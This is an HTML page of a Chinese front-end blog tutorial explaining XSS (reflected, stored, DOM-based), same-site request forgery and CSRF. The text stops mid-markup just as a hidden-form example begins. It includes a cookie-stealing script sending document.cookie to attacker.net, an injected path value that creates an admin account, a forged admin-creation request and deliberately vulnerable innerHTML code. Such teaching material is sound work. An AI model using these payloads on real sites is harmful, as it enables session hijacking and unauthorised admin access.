<!DOCTYPE html><html lang="zh"><head><meta name="generator" content="Hugo 0.51"><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="HandheldFriendly" content="True"><meta name="viewport" content="initial-scale=1,width=device-width,minimum-scale=1,maximum-scale=1,user-scalable=no"><meta name="wap-font-scale" content="no"><meta name="360-site-verification" content="0903ba33c82867d1f7bd8831e32a7e34"><meta name="sogou_site_verification" content="E8uWFBcf4a"><meta name="author" content="Fan"><meta name="description" itemprop="description" content="Alili | 前端大爆炸! - WEB BANG! BANG!! BANG!!! 前端大爆炸,一个前端技术博客.想到哪,学到哪,写到哪. 本文资源来源互联网，仅供学习研究使用，版权归该资源的合法拥有者所有， Alili, 前端大爆炸, WEB BANG BANG BANG, web前端博客, 前端模块化, 前端工程化, 前端数据监控, 性能优化, 网页制作, 前端, js, html5, css"><meta name="keywords" content="Alili, 前端大爆炸, WEB BANG BANG BANG, web前端博客, 前端模块化, 前端工程化, 前端数据监控, 性能优化, 网页制作, 前端, js, html5, css, 踩坑小报告, 微前端, 树莓派, 前端开发, 区块链, 网络, Mongodb, Vue.js, Angular.js, node.js"><meta property="og:locale" content="en_US"><meta property="og:title" content="XSS 和 CSRF 两种跨站攻击"><meta property="og:image" content="https://alili.tech/images/logo2.png"><meta property="og:description" content="Alili | 前端大爆炸! - WEB BANG! BANG!! BANG!!! 前端大爆炸,一个前端技术博客.想到哪,学到哪,写到哪. 本文资源来源互联网，仅供学习研究使用，版权归该资源的合法拥有者所有， Alili, 前端大爆炸, WEB BANG BANG BANG, web前端博客, 前端模块化, 前端工程化, 前端数据监控, 性能优化, 网页制作, 前端, js, html5, css"><meta property="og:site_name" content="Alili"><title>XSS 和 CSRF 两种跨站攻击 | 前端大爆炸! - WEB BANG! BANG!! BANG!!!</title><link rel="shortcut icon" href="https://alili.tech/images/favicon.ico"><link rel="manifest" href="/manifest.json"><link rel="stylesheet" href="https://alili.tech/lib/font-awesome/css/font-awesome.min.css"><link rel="stylesheet" href="https://alili.tech/lib/justified-gallery/justifiedGallery.min.css"><link rel="stylesheet" href="https://alili.tech/css/style.css"><script src="https://alili.tech/lib/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();</script><script src="https://alili.tech/lib/jquery/jquery.min.js"></script><script>document.addEventListener("error", function (e) {
			  var elem = e.target;
			  if (elem.tagName.toLowerCase() == 'img') {
				elem.style.display='none'
			  }
			}, true);</script><script type="application/ld+json">{
				"@context": "https://ziyuan.baidu.com/contexts/cambrian.jsonld",
				"@id": "https://alili.tech/archive/foopjzqqm5d/",
				"appid": "1613049289050283", 
				"title": "XSS 和 CSRF 两种跨站攻击 | 前端大爆炸! - WEB BANG! BANG!! BANG!!!", 
				"images": [],
				"pubDate": "2019-01-30T02:30:23"
			}</script></head><body><div id="header-post"><a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a> <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a> <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a> <span id="menu"><span id="nav"><ul><li><a href="/">Home</a></li><li><a href="/archive/">Archives</a></li><li><a href="/about/">About</a></li><li><a href="http://github.com/Fantasy9527" target="_blank">Github</a></li></ul></span><br><span id="actions"><ul><li><a class="icon" href="https://alili.tech/archive/ity45of6s7n/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle();' onmouseout='$("#i-prev").toggle();'></i></a></li><li><a class="icon" href="https://alili.tech/archive/a7slcgcyv4/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle();' onmouseout='$("#i-next").toggle();'></i></a></li><li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle();' onmouseout='$("#i-top").toggle();'></i></a></li><li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle();' onmouseout='$("#i-share").toggle();' onclick='$("#share").toggle();return false;'></i></a></li></ul><span id="i-prev" class="info" style="display:none;">Previous post</span> <span id="i-next" class="info" style="display:none;">Next post</span> <span id="i-top" class="info" style="display:none;">Back to top</span> <span id="i-share" class="info" style="display:none;">Share post</span></span><br><div id="share" style="display: none"><ul><li><a class="icon" href="http://v.t.sina.com.cn/share/share.php?u=https%3a%2f%2falili.tech%2farchive%2ffoopjzqqm5d%2f&text=XSS%20%e5%92%8c%20CSRF%20%e4%b8%a4%e7%a7%8d%e8%b7%a8%e7%ab%99%e6%94%bb%e5%87%bb"><i class="fa fa-weibo" aria-hidden="true"></i></a></li><li><a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2falili.tech%2farchive%2ffoopjzqqm5d%2f"><i class="fa fa-facebook" aria-hidden="true"></i></a></li><li><a class="icon" href="https://twitter.com/share?url=https%3a%2f%2falili.tech%2farchive%2ffoopjzqqm5d%2f&text=XSS%20%e5%92%8c%20CSRF%20%e4%b8%a4%e7%a7%8d%e8%b7%a8%e7%ab%99%e6%94%bb%e5%87%bb"><i class="fa fa-twitter" aria-hidden="true"></i></a></li><li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2falili.tech%2farchive%2ffoopjzqqm5d%2f&title=XSS%20%e5%92%8c%20CSRF%20%e4%b8%a4%e7%a7%8d%e8%b7%a8%e7%ab%99%e6%94%bb%e5%87%bb"><i class="fa fa-linkedin" aria-hidden="true"></i></a></li><li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2falili.tech%2farchive%2ffoopjzqqm5d%2f&is_video=false&description=XSS%20%e5%92%8c%20CSRF%20%e4%b8%a4%e7%a7%8d%e8%b7%a8%e7%ab%99%e6%94%bb%e5%87%bb"><i class="fa fa-pinterest" aria-hidden="true"></i></a></li><li><a class="icon" href="mailto:?subject=XSS%20%e5%92%8c%20CSRF%20%e4%b8%a4%e7%a7%8d%e8%b7%a8%e7%ab%99%e6%94%bb%e5%87%bb&body=Check out this article: https%3a%2f%2falili.tech%2farchive%2ffoopjzqqm5d%2f"><i class="fa fa-envelope" aria-hidden="true"></i></a></li><li><a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2falili.tech%2farchive%2ffoopjzqqm5d%2f&title=XSS%20%e5%92%8c%20CSRF%20%e4%b8%a4%e7%a7%8d%e8%b7%a8%e7%ab%99%e6%94%bb%e5%87%bb"><i class="fa fa-get-pocket" aria-hidden="true"></i></a></li><li><a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2falili.tech%2farchive%2ffoopjzqqm5d%2f&title=XSS%20%e5%92%8c%20CSRF%20%e4%b8%a4%e7%a7%8d%e8%b7%a8%e7%ab%99%e6%94%bb%e5%87%bb"><i class="fa fa-reddit" aria-hidden="true"></i></a></li><li><a class="icon" href="http://www.stumbleupon.com/submit?url=https%3a%2f%2falili.tech%2farchive%2ffoopjzqqm5d%2f&title=XSS%20%e5%92%8c%20CSRF%20%e4%b8%a4%e7%a7%8d%e8%b7%a8%e7%ab%99%e6%94%bb%e5%87%bb"><i class="fa fa-stumbleupon" aria-hidden="true"></i></a></li><li><a class="icon" href="http://digg.com/submit?url=https%3a%2f%2falili.tech%2farchive%2ffoopjzqqm5d%2f&title=XSS%20%e5%92%8c%20CSRF%20%e4%b8%a4%e7%a7%8d%e8%b7%a8%e7%ab%99%e6%94%bb%e5%87%bb"><i class="fa fa-digg" aria-hidden="true"></i></a></li></ul></div><div id="toc"><nav id="TableOfContents"><ul><li><a href="#版权声明">版权声明</a><ul><li><a href="#原文标题">原文标题</a></li><li><a href="#原文链接">原文链接</a></li></ul></li></ul></nav></div></span></div><div class="content index width mx-auto px3 my3"><section id="wrapper" class="home"><article class="post" itemscope itemtype="http://schema.org/BlogPosting"><header><h1 class="posttitle" itemprop="name headline">XSS 和 CSRF 两种跨站攻击</h1><div class="meta"><div class="postdate"><time datetime="2019-01-30" itemprop="datePublished">2019-01-30</time></div><div class="article-tag"><i class="fa fa-eye"></i> <span id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv">0</span></span></div><div class="article-tag-box"></div></div></header><div class="content" itemprop="articleBody"><div id="raw"><p style="opacity: 0;">Alili | 前端大爆炸! - WEB BANG! BANG!! BANG!!! 前端大爆炸,一个前端技术博客.想到哪,学到哪,写到哪. 本文资源来源互联网，仅供学习研究使用，版权归该资源的合法拥有者所有， Alili, 前端大爆炸, WEB BANG BANG BANG, web前端博客, 前端模块化, 前端工程化, 前端数据监控, 性能优化, 网页制作, 前端, js, html5, css, 踩坑小报告, 微前端, 树莓派, 前端开发, 区块链, 网络, Mongodb, Vue.js, Angular.js, node.js</p><script>$(function () {
            var html = "\n\n                    \n\x3cp\x3e差不多刚开始接触前端的时候，经常能看到一些早几年入行大牛们的简历，几乎所有人都会在简历中带上这么一句话：具备基本的 Web 安全知识（XSS \/ CSRF）。显然这已经成为前端人员的必备知识。\x3c\/p\x3e\n\x3cp\x3e\x3cspan class=\x22img-wrap\x22\x3e\x3cimg data-src=\x22\/img\/bVGiYS?w=680\x26amp;h=447\x22 src=\x22https:\/\/static.alili.tech\/img\/bVGiYS?w=680\x26amp;h=447\x22 alt=\x22clipboard.png\x22 title=\x22clipboard.png\x22 style=\x22cursor: pointer; display: inline;\x22\x3e\x3c\/span\x3e\x3c\/p\x3e\n\x3cp\x3e非常怀念那个 SQL 注入还没有被普遍认可的年代，虽然这么多年过去了，SQL 注入并没有消失，仍然是最危险的漏洞。关于 SQL 注入的原理，可以看我之前写的文章\x3ca href=\x22http:\/\/yuren.space\/blog\/2016\/10\/01\/SQL%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3\/\x22 rel=\x22nofollow noreferrer\x22 target=\x22_blank\x22\x3eSQL 注入详解\x3c\/a\x3e。今天是主题是 Web 安全的另外两大杀手，XSS 和 CSRF。\x3c\/p\x3e\n\x3ch2 id=\x22articleHeader0\x22\x3eXSS 的分类\x3c\/h2\x3e\n\x3cp\x3eXSS 漏洞有多种形式，分为三类，反射型、保存型和基于 DOM 的 XSS 攻击。这些漏洞的基本原理都是一样的，但是确定和利用漏洞方面又存在很大的差异，下面将对这三种漏洞详细介绍。\x3c\/p\x3e\n\x3ch3 id=\x22articleHeader1\x22\x3e反射型 XSS 漏洞\x3c\/h3\x3e\n\x3cp\x3e前面废话一大堆，还是没有说 XSS 漏洞到底是什么。如果一个 Web 程序可以动态的显示用户的错误消息，就有可能会产生反射型漏洞。\x3c\/p\x3e\n\x3cp\x3e用户浏览网页时发送错误，向服务器请求 URL，比如\x3ccode\x3ewww.xxx.com\/error.php?message=sorry,an error occurred\x3c\/code\x3e，然后服务器根据得到的 message，\x3cstrong\x3e不进行过滤\x3c\/strong\x3e，复制到错误页面的模板中：\x3ccode\x3e\x26lt;p\x26gt;sorry,an error occurred\x26lt;\/p\x26gt;\x3c\/code\x3e，返回给用户。\x3c\/p\x3e\n\x3cp\x3e这个漏洞有一个显著的特征，应用程序没有进行任何过滤或净化措施，就非常容易受到攻击。\x3ccode\x3ewww.xxx.com\/error.php?message=\x26lt;script\x26gt;alert(1)\x26lt;\/script\x26gt;\x3c\/code\x3e，当用户打开错误页面时，就会出现\x3ccode\x3e\x26lt;p\x26gt;\x26lt;script\x26gt;alert(1)\x26lt;\/script\x26gt;\x26lt;\/p\x26gt;\x3c\/code\x3e，弹出一个消息框。\x3c\/p\x3e\n\x3cp\x3e显然，攻击人员不会很傻的仅仅 alert 一些消息，在 IE 中，如果开启跨站点脚本检测可能无法弹出消息。通常 XSS 都会伴随着会话劫持，攻击者截获通过验证的用户的会话令牌。劫持用户的会话后，攻击者就可以访问该用户授权访问的所有数据和功能。\x3c\/p\x3e\n\x3cp\x3e比如攻击者构造一个这样的 URL，message 信息如下\x3c\/p\x3e\n\x3cdiv class=\x22widget-codetool\x22 style=\x22display:none;\x22\x3e\n      \x3cdiv class=\x22widget-codetool--inner\x22\x3e\n      \x3cspan class=\x22selectCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22全选\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22copyCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 data-clipboard-text=\x22var i = new Image;\ni.src=\x26quot;http:\/\/attacker.net\/\x26quot;\x2bdocument.cookie;\x22 title=\x22\x22 data-original-title=\x22复制\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22saveToNote code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22放进笔记\x22\x3e\x3c\/span\x3e\n      \x3c\/div\x3e\n      \x3c\/div\x3e\x3cpre class=\x22hljs dart\x22\x3e\x3ccode\x3e\x3cspan class=\x22hljs-keyword\x22\x3evar\x3c\/span\x3e i = \x3cspan class=\x22hljs-keyword\x22\x3enew\x3c\/span\x3e Image;\ni.src=\x3cspan class=\x22hljs-string\x22\x3e\x22http:\/\/attacker.net\/\x22\x3c\/span\x3e\x2b\x3cspan class=\x22hljs-built_in\x22\x3edocument\x3c\/span\x3e.cookie;\x3c\/code\x3e\x3c\/pre\x3e\n\x3cp\x3e这样被攻击者通过访问这个恶意的 URL，就会把 cookie 发送给黑客，黑客截获 cookie，就能执行用户的任意操纵。下图是一个简易的流程图：\x3c\/p\x3e\n\x3cp\x3e\x3cspan class=\x22img-wrap\x22\x3e\x3cimg data-src=\x22\/img\/bVGiXL?w=471\x26amp;h=280\x22 src=\x22https:\/\/static.alili.tech\/img\/bVGiXL?w=471\x26amp;h=280\x22 alt=\x22clipboard.png\x22 title=\x22clipboard.png\x22 style=\x22cursor: pointer; display: inline;\x22\x3e\x3c\/span\x3e\x3c\/p\x3e\n\x3cp\x3e这个图还有一个重要的点没有标明出来，就是前提是受害者要先登录到 Bank.com 的网站上。\x3c\/p\x3e\n\x3cp\x3e由于浏览器的同源策略，直接向 attacker.net 发送 document.cookie 是无法获得 www.xxx.com 的 cookie，因为浏览器会对不同源（域）的内容进行隔离，这就是该漏洞被称为跨站脚本的原因。\x3c\/p\x3e\n\x3ch3 id=\x22articleHeader2\x22\x3e保存型 XSS 漏洞\x3c\/h3\x3e\n\x3cp\x3e保存型跨站脚本也是比较常见的漏洞，脚本通常保存在后端数据库中，不经过滤就存储并且显示给用户，此时就会出现这种漏洞。\x3c\/p\x3e\n\x3cp\x3e与反射型的流程不同的是，保存型需要向服务器提出至少两次请求，第一次将含有恶意代码的数据提交给服务器，服务器将数据保存，第二次是受害者想服务器提出访问含有恶意代码数据的页面，恶意代码执行。\x3c\/p\x3e\n\x3cp\x3e与反射型不同的是，保存型不需要一个专门设计的 URL 来接收 cookie，只需要将含有恶意代码的页面发给用户，等待受害者访问即可。不过，也可用保存型的漏洞来获取用户 cookie 进行劫持。\x3c\/p\x3e\n\x3cp\x3e还有一个不同点，反射型的漏洞，必须要等受害者登陆后，才能保证 cookie 的正常获得，而保存型的漏洞，受害者一般是先登录，然后访问改站点有危险的页面。\x3c\/p\x3e\n\x3cp\x3e举一个例子，比如某社交论坛存在保存型的 XSS 漏洞，黑客将自己的个人信息一栏修改成恶意的 JS 代码，改代码实现两个功能，首先受害者加自己为好友，其次修改受害者的个人信息为该恶意代码。黑客把个人信息保存并提交给服务器，只需要等受害者访问自己的个人信息页面，浏览器就会执行该恶意脚本，于是可怕的“蠕虫”就开始了。\x3c\/p\x3e\n\x3ch3 id=\x22articleHeader3\x22\x3e基于 DOM 的 XSS 漏洞\x3c\/h3\x3e\n\x3cp\x3e前两种 XSS 漏洞，都表现一种特殊的模式，就是应用程序提取数据并返回给受害者，而基于 DOM 的 XSS 不具有这种特点，攻击者是借助于 JavaScript 来展开攻击的。\x3c\/p\x3e\n\x3col\x3e\n\x3cli\x3e\x3cp\x3e用户请求一个经过专门设计的 URL，由攻击者提交，包括嵌入式的 JavaScript；\x3c\/p\x3e\x3c\/li\x3e\n\x3cli\x3e\x3cp\x3e服务器的响应不包含任何攻击者的脚本，同时服务器也不会对 URL 进行检测；\x3c\/p\x3e\x3c\/li\x3e\n\x3cli\x3e\x3cp\x3e当用户浏览这个响应时，脚本得以处理。\x3c\/p\x3e\x3c\/li\x3e\n\x3c\/ol\x3e\n\x3cp\x3e与反射型漏洞类似，都是对 URL 进行特殊构造，不同的是，反射型是由服务器处理 URL，而 DOM 型是由 JavaScript 脚本来处理。还以刚才那个反射型为例子，假设应用程序返回的错误页面包含以下 JS 脚本：\x3c\/p\x3e\n\x3cdiv class=\x22widget-codetool\x22 style=\x22display:none;\x22\x3e\n      \x3cdiv class=\x22widget-codetool--inner\x22\x3e\n      \x3cspan class=\x22selectCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22全选\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22copyCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 data-clipboard-text=\x22\x3cscript\x3e\n  \/\/ www.xxx.com\/error.php?message=sorry,an error occurred\n  var url = document.location;\n  var message = \/message=(.\x2b)$\/.exec(url)[1];\n  document.wirte(message);\n  \/\/或者\n  document.getElementById(\x26quot;show\x26quot;).innerHTML = message;\n\x3c\/script\x3e\x22 title=\x22\x22 data-original-title=\x22复制\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22saveToNote code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22放进笔记\x22\x3e\x3c\/span\x3e\n      \x3c\/div\x3e\n      \x3c\/div\x3e\x3cpre class=\x22hljs xml\x22\x3e\x3ccode\x3e\x3cspan class=\x22hljs-tag\x22\x3e\x26lt;\x3cspan class=\x22hljs-name\x22\x3escript\x3c\/span\x3e\x26gt;\x3c\/span\x3e\x3cspan class=\x22javascript\x22\x3e\n  \x3cspan class=\x22hljs-comment\x22\x3e\/\/ www.xxx.com\/error.php?message=sorry,an error occurred\x3c\/span\x3e\n  \x3cspan class=\x22hljs-keyword\x22\x3evar\x3c\/span\x3e url = \x3cspan class=\x22hljs-built_in\x22\x3edocument\x3c\/span\x3e.location;\n  \x3cspan class=\x22hljs-keyword\x22\x3evar\x3c\/span\x3e message = \x3cspan class=\x22hljs-regexp\x22\x3e\/message=(.\x2b)$\/\x3c\/span\x3e.exec(url)[\x3cspan class=\x22hljs-number\x22\x3e1\x3c\/span\x3e];\n  \x3cspan class=\x22hljs-built_in\x22\x3edocument\x3c\/span\x3e.wirte(message);\n  \x3cspan class=\x22hljs-comment\x22\x3e\/\/或者\x3c\/span\x3e\n  \x3cspan class=\x22hljs-built_in\x22\x3edocument\x3c\/span\x3e.getElementById(\x3cspan class=\x22hljs-string\x22\x3e\x22show\x22\x3c\/span\x3e).innerHTML = message;\n\x3c\/span\x3e\x3cspan class=\x22hljs-tag\x22\x3e\x26lt;\/\x3cspan class=\x22hljs-name\x22\x3escript\x3c\/span\x3e\x26gt;\x3c\/span\x3e\x3c\/code\x3e\x3c\/pre\x3e\n\x3cp\x3e同样给受害者发送这样的链接 \x3ccode\x3ewww.xxx.com\/error.php?message=\x26lt;script\x26gt;alert(1)\x26lt;\/script\x26gt;\x3c\/code\x3e，也可以开展 XSS 漏洞攻击。基于 DOM 的漏洞不局限与 URL，还可以是页面某个 DOM 的内容，这和存储型的 XSS 又联系到一起。\x3c\/p\x3e\n\x3cp\x3e这个时候就需要些 JS 的同学小心谨慎了，万一写出含有漏洞的代码，这锅得自己背。\x3c\/p\x3e\n\x3ch2 id=\x22articleHeader4\x22\x3e请求伪造\x3c\/h2\x3e\n\x3cp\x3e在 XSS 跨站攻击中，攻击者需要获得受害者的会话令牌，请求伪造也与会话劫持相关，但是攻击者不需要知道受害者的会话令牌，就能够行驶“受害者”的权利。请求伪造有两种，本站点请求伪造（OSRF）和跨站点请求伪造（CSRF），\x3c\/p\x3e\n\x3ch3 id=\x22articleHeader5\x22\x3eOSRF\x3c\/h3\x3e\n\x3cp\x3eOSRF 是一种利用保存型 XSS 漏洞的攻击载荷，如果在得知应用程序对 XSS 漏洞过滤的情况下，可以尝试 OSRF 攻击。\x3c\/p\x3e\n\x3cp\x3e比如这是一个某站点 POST 请求，该站点过滤 XSS 攻击，\x3c\/p\x3e\n\x3cdiv class=\x22widget-codetool\x22 style=\x22display:none;\x22\x3e\n      \x3cdiv class=\x22widget-codetool--inner\x22\x3e\n      \x3cspan class=\x22selectCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22全选\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22copyCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 data-clipboard-text=\x22POST \/submit.php\nHost: xxx.com\nContent-Length: ..\n\ntype=question\x26amp;name=ge\x26amp;message=mes\x22 title=\x22\x22 data-original-title=\x22复制\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22saveToNote code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22放进笔记\x22\x3e\x3c\/span\x3e\n      \x3c\/div\x3e\n      \x3c\/div\x3e\x3cpre class=\x22hljs stylus\x22\x3e\x3ccode\x3ePOST \/submit\x3cspan class=\x22hljs-selector-class\x22\x3e.php\x3c\/span\x3e\nHost: xxx\x3cspan class=\x22hljs-selector-class\x22\x3e.com\x3c\/span\x3e\nContent-Length: ..\n\ntype=question\x26amp;name=ge\x26amp;message=mes\x3c\/code\x3e\x3c\/pre\x3e\n\x3cp\x3e然后该信息将会被插入到如下的 HTML 中：\x3c\/p\x3e\n\x3cdiv class=\x22widget-codetool\x22 style=\x22display:none;\x22\x3e\n      \x3cdiv class=\x22widget-codetool--inner\x22\x3e\n      \x3cspan class=\x22selectCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22全选\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22copyCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 data-clipboard-text=\x22\x3ctr\x3e\n  \x3ctd\x3e\x3cimg src=\x26quot;\/images\/question.jpg\x26quot;\x3e\x3c\/td\x3e\n  \x3ctd\x3ege\x3c\/td\x3e\n  \x3ctd\x3emes\x3c\/td\x3e\n\x3c\/tr\x3e\x22 title=\x22\x22 data-original-title=\x22复制\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22saveToNote code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22放进笔记\x22\x3e\x3c\/span\x3e\n      \x3c\/div\x3e\n      \x3c\/div\x3e\x3cpre class=\x22hljs xml\x22\x3e\x3ccode\x3e\x3cspan class=\x22hljs-tag\x22\x3e\x26lt;\x3cspan class=\x22hljs-name\x22\x3etr\x3c\/span\x3e\x26gt;\x3c\/span\x3e\n  \x3cspan class=\x22hljs-tag\x22\x3e\x26lt;\x3cspan class=\x22hljs-name\x22\x3etd\x3c\/span\x3e\x26gt;\x3c\/span\x3e\x3cspan class=\x22hljs-tag\x22\x3e\x26lt;\x3cspan class=\x22hljs-name\x22\x3eimg\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3esrc\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e\x22\/images\/question.jpg\x22\x3c\/span\x3e\x26gt;\x3c\/span\x3e\x3cspan class=\x22hljs-tag\x22\x3e\x26lt;\/\x3cspan class=\x22hljs-name\x22\x3etd\x3c\/span\x3e\x26gt;\x3c\/span\x3e\n  \x3cspan class=\x22hljs-tag\x22\x3e\x26lt;\x3cspan class=\x22hljs-name\x22\x3etd\x3c\/span\x3e\x26gt;\x3c\/span\x3ege\x3cspan class=\x22hljs-tag\x22\x3e\x26lt;\/\x3cspan class=\x22hljs-name\x22\x3etd\x3c\/span\x3e\x26gt;\x3c\/span\x3e\n  \x3cspan class=\x22hljs-tag\x22\x3e\x26lt;\x3cspan class=\x22hljs-name\x22\x3etd\x3c\/span\x3e\x26gt;\x3c\/span\x3emes\x3cspan class=\x22hljs-tag\x22\x3e\x26lt;\/\x3cspan class=\x22hljs-name\x22\x3etd\x3c\/span\x3e\x26gt;\x3c\/span\x3e\n\x3cspan class=\x22hljs-tag\x22\x3e\x26lt;\/\x3cspan class=\x22hljs-name\x22\x3etr\x3c\/span\x3e\x26gt;\x3c\/span\x3e\x3c\/code\x3e\x3c\/pre\x3e\n\x3cp\x3e这个漏洞很容易利用，直接用 type 的值来表示 jpg 的name，然后我们构造 type 的值等于下面的内容（这不就是利用路径来搞事吗），\x3c\/p\x3e\n\x3cdiv class=\x22widget-codetool\x22 style=\x22display:none;\x22\x3e\n      \x3cdiv class=\x22widget-codetool--inner\x22\x3e\n      \x3cspan class=\x22selectCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22全选\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22copyCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 data-clipboard-text=\x22..\/admin\/newuser.php?username=test\x26amp;password=123\x26amp;role=admin#\x22 title=\x22\x22 data-original-title=\x22复制\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22saveToNote code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22放进笔记\x22\x3e\x3c\/span\x3e\n      \x3c\/div\x3e\n      \x3c\/div\x3e\x3cpre class=\x22hljs dts\x22\x3e\x3ccode style=\x22word-break: break-word; white-space: initial;\x22\x3e..\x3cspan class=\x22hljs-meta-keyword\x22\x3e\/admin\/\x3c\/span\x3enewuser.php?username=test\x3cspan class=\x22hljs-variable\x22\x3e\x26amp;password\x3c\/span\x3e=\x3cspan class=\x22hljs-number\x22\x3e123\x3c\/span\x3e\x3cspan class=\x22hljs-variable\x22\x3e\x26amp;role\x3c\/span\x3e=admin\x3cspan class=\x22hljs-meta\x22\x3e#\x3c\/span\x3e\x3c\/code\x3e\x3c\/pre\x3e\n\x3cp\x3e使用上面的介绍，相对应的构造一个表单提交，创建一个管理员权限的用户，普通用户点击是不会成功的，因为权限不够，但是如果是管理员点击该链接的话，就会创建一个秘密账户，所以，即时对 URL 禁用了 JavaScript 脚本，还是可以通过 OSRF 攻击成功。\x3c\/p\x3e\n\x3cp\x3e在攻击字符串的最后使用了 # ，是为了对 .jpg 进行屏蔽，也可以添加 \x26amp; 组成另一个参数。\x3c\/p\x3e\n\x3cp\x3e以上便是一个简单的本站点请求伪造的例子。\x3c\/p\x3e\n\x3ch3 id=\x22articleHeader6\x22\x3eCSRF\x3c\/h3\x3e\n\x3cp\x3e跨站点请求伪造才是跨站伪造的重点内容，攻击者只需要创建一个看似无害的网站，致使受害者的浏览器直接向易受攻击的服务器提交一个请求，执行恶意代码。\x3c\/p\x3e\n\x3cp\x3e仍然需要考虑同源策略，仍然以管理员创建新用户为例，\x3c\/p\x3e\n\x3cdiv class=\x22widget-codetool\x22 style=\x22display:none;\x22\x3e\n      \x3cdiv class=\x22widget-codetool--inner\x22\x3e\n      \x3cspan class=\x22selectCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22全选\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22copyCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 data-clipboard-text=\x22POST \/newUser.php HTTP\/1.1\nHost: xxx.com\nCookie: SessionId=...\nContent-Length: ..\n\nname=ro\x26amp;userrole=admin\x26amp;password=123456\x26amp;confirmpassword=123456\x22 title=\x22\x22 data-original-title=\x22复制\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22saveToNote code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22放进笔记\x22\x3e\x3c\/span\x3e\n      \x3c\/div\x3e\n      \x3c\/div\x3e\x3cpre class=\x22hljs http\x22\x3e\x3ccode\x3e\x3cspan class=\x22hljs-keyword\x22\x3ePOST\x3c\/span\x3e \x3cspan class=\x22hljs-string\x22\x3e\/newUser.php\x3c\/span\x3e HTTP\/1.1\n\x3cspan class=\x22hljs-attribute\x22\x3eHost\x3c\/span\x3e: xxx.com\n\x3cspan class=\x22hljs-attribute\x22\x3eCookie\x3c\/span\x3e: SessionId=...\n\x3cspan class=\x22hljs-attribute\x22\x3eContent-Length\x3c\/span\x3e: ..\n\n\x3cspan class=\x22dts\x22\x3ename=ro\x3cspan class=\x22hljs-variable\x22\x3e\x26amp;userrole\x3c\/span\x3e=admin\x3cspan class=\x22hljs-variable\x22\x3e\x26amp;password\x3c\/span\x3e=\x3cspan class=\x22hljs-number\x22\x3e123456\x3c\/span\x3e\x3cspan class=\x22hljs-variable\x22\x3e\x26amp;confirmpassword\x3c\/span\x3e=\x3cspan class=\x22hljs-number\x22\x3e123456\x3c\/span\x3e\x3c\/span\x3e\x3c\/code\x3e\x3c\/pre\x3e\n\x3cp\x3e黑客构造的网站会提交一个 form 表单，并想办法让 form 隐藏：\x3c\/p\x3e\n\x3cdiv class=\x22widget-codetool\x22 style=\x22display:none;\x22\x3e\n      \x3cdiv class=\x22widget-codetool--inner\x22\x3e\n      \x3cspan class=\x22selectCode code-tool\x22 